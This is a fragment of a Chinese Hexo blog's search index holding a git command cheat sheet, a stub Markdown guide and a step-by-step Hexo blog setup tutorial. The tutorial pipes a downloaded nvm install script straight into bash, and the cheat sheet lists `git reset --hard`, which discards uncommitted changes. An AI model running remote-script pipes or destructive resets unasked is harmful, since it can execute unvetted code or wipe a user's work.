class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恢复暂存区的指定文件到工作区</span></span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复某个commit的指定文件到暂存区和工作区</span></span><br><span class="line">$ git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存区的所有文件到工作区</span></span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span></span><br><span class="line">$ git reset [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置暂存区与工作区，与上一次commit保持一致</span></span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span></span><br><span class="line">$ git reset [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span></span><br><span class="line">$ git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span></span><br><span class="line">$ git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个commit，用来撤销指定commit</span></span><br><span class="line"><span class="comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span></span><br><span class="line">$ git revert [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂时将未提交的变化移除，稍后再移入</span></span><br><span class="line">$ git stash</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一个可供发布的压缩包</span></span><br><span class="line">$ git archive</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法入门指南（待续）</title>
      <link href="/2017/06/29/markdown%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2017/06/29/markdown%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>灵感来源 – <a href="http://www.appinn.com/markdown/">Markdown 语法说明 (简体中文版)</a></p><p>未完，待续</p><span id="more"></span><p><img src="https://cdn.zhengxiangling.com/17-8-2/94663924.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/94663924.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/2017/06/26/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2017/06/26/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>一、技术栈</p><ol><li>Markdown</li><li>Hexo</li><li>git</li></ol><p>二、工具</p><ol><li>图床 – <a href="https://jiantuku.com/">极简图床</a></li></ol><p>三、开始搞事情</p><blockquote><blockquote><p>注：此教程使用的命令基于 Linux, 在Window系统上的安装方式会稍有不同。</p></blockquote></blockquote><span id="more"></span><p>1.Hexo是什么？<br>简单地说，Hexo是一个轻量级的Node.js博客框架，反正我们搭建博客的框架就是他了。</p><p>2.install git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-core</span><br><span class="line">// 测试安装成功，输出版本号即安装成功</span><br><span class="line">git version</span><br></pre></td></tr></table></figure><p>3.install node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.6/install.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/.nvm&quot;</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; . <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> <span class="comment"># This loads nvm</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> -v nvm</span><br><span class="line"></span><br><span class="line">nvm install stable</span><br><span class="line">// 测试安装成功，输出版本号即安装成功</span><br><span class="line">node --version</span><br></pre></td></tr></table></figure><p>4.国内的npm速度受限，可以使用淘宝镜像加速。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br><span class="line">// 测试安装成功，输出版本号即安装成功</span><br><span class="line">cnpm version</span><br></pre></td></tr></table></figure><p>5.install hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cnpm install -g hexo-cli</span><br><span class="line">// 测试安装成功，输出版本号即安装成功</span><br><span class="line">hexo version</span><br></pre></td></tr></table></figure><p>6.注册 极简图床 和 Coding 账号</p><p>7.开始搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 新建用于存放博客的文件夹</span><br><span class="line"><span class="built_in">mkdir</span> hexo-start</span><br><span class="line"><span class="built_in">cd</span> hexo-start</span><br><span class="line"></span><br><span class="line">// 初始化hexo</span><br><span class="line">hexo init</span><br><span class="line">cnpm install</span><br></pre></td></tr></table></figure><p>目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes </span><br></pre></td></tr></table></figure><p>8.run起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>然后访问<a href="http://localhost:4000/%EF%BC%8C%E8%AE%BF%E9%97%AE%E6%88%90%E5%8A%9F%E8%AF%B4%E6%98%8E%E6%88%90%E5%8A%9F%E4%BA%86%E7%AC%AC%E4%B8%80%E6%AD%A5%E4%BA%86%E3%80%82">http://localhost:4000/，访问成功说明成功了第一步了。</a></p><p>9.使用hexo-admin可视化编写博客</p><p>1)install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cnpm install --save bcrypt-nodejs</span><br><span class="line">cnpm install --save hexo-admin</span><br></pre></td></tr></table></figure><p>2)创建admin的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">node</span><br><span class="line">&gt; const bcrypt = require(<span class="string">&#x27;bcrypt-nodejs&#x27;</span>)</span><br><span class="line">// undefined</span><br><span class="line">&gt; bcrypt.hashSync(<span class="string">&#x27;your_ password&#x27;</span>)</span><br><span class="line">//<span class="string">&#x27;$2a$10$cHnT1Ri... 这是密码的哈希映射值&#x27;</span></span><br></pre></td></tr></table></figure><p>3）编辑_config.yml，配置用户名和密码，加入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">admin</span>:</span><br><span class="line">  <span class="attr">username</span>: user_name</span><br><span class="line">  <span class="attr">password_hash</span>: 填入前面生成的密码的哈希值</span><br><span class="line">  <span class="attr">secret</span>: a secret something (用于产生cookie值的，可以不用变)</span><br></pre></td></tr></table></figure><p>重新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>此三句命令是重复的，我们加到<code>.sh</code>文件然后每次用<code>bash</code>命令执行即可。</p><p>新建<code>restart.sh</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>然后每次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash restart.sh</span><br></pre></td></tr></table></figure><p>即可</p><p>然后访问<a href="http://localhost:4000/admin%EF%BC%8C%E5%87%BA%E7%8E%B0%E4%B8%8B%E5%9B%BE%E8%AF%B4%E6%98%8Eadmin%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F">http://localhost:4000/admin，出现下图说明admin安装成功</a><br><img src="https://cdn.zhengxiangling.com/17-11-4/24341704.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-11-4/24341704.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>10.实现RRS订阅功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><p>然后配置_config.yml</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># feed</span><br><span class="line"><span class="attr">feed</span>:</span><br><span class="line">  <span class="attr">type</span>: atom</span><br><span class="line">  <span class="attr">path</span>: atom.<span class="property">xml</span></span><br><span class="line">  <span class="attr">limit</span>: <span class="number">20</span></span><br><span class="line">  <span class="attr">hub</span>:</span><br><span class="line">   content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash restart.sh</span><br></pre></td></tr></table></figure><p>即<a href="http://localhost:4000/atom.xml">http://localhost:4000/atom.xml</a></p><p>11.更换主题<br><a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>其他主题自选，这里使用NexT主题作为演示</p><p>1)install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next.git</span><br></pre></td></tr></table></figure><p>2)启用主题<br>修改_config.yml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash restart.sh</span><br></pre></td></tr></table></figure><p>重新访问，主题更换了说明更换主题成功。<br>NexT主题更多配置（修改样式及第三方服务）自行查看文档。<br><a href="http://theme-next.iissnan.com/getting-started.html">http://theme-next.iissnan.com/getting-started.html</a></p><p>12.将静态页面部署到 coding 上<br>1)install hexo-deployer-git 插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>2)coding新建项目，hexo-start</p><p>3)然后修改<code>_config.yml</code></p><p>修改 root，将root改为coding上面的项目名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line">...</span><br><span class="line">root: /hexo-start/</span><br><span class="line">...</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br></pre></td></tr></table></figure><p>修改远程coding的地址<br><img src="https://cdn.zhengxiangling.com/17-11-4/21989627.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-11-4/21989627.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><code>repo</code>要填的仓库地址如图所示的位置，点击复制即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: 仓库地址</span><br><span class="line">  branch: master</span><br><span class="line">  message: blog update</span><br></pre></td></tr></table></figure><p>4)修改完之后，部署到 coding 上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>5)开启 Pages 服务</p><p><img src="https://cdn.zhengxiangling.com/17-11-4/88756341.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-11-4/88756341.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>点击 Pages服务，部署来源选择 master 分支，点击 保存。显示 Coding Pages 已经运行在 http:&#x2F;&#x2F;… ,说明已经成功将博客部署在 coding 上了。</p><p><img src="https://cdn.zhengxiangling.com/59551e572a02a.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/59551e572a02a.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><blockquote><blockquote><p>代码地址 <a href="https://github.com/ElijahZheng/hexo-start">https://github.com/ElijahZheng/hexo-start</a></p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
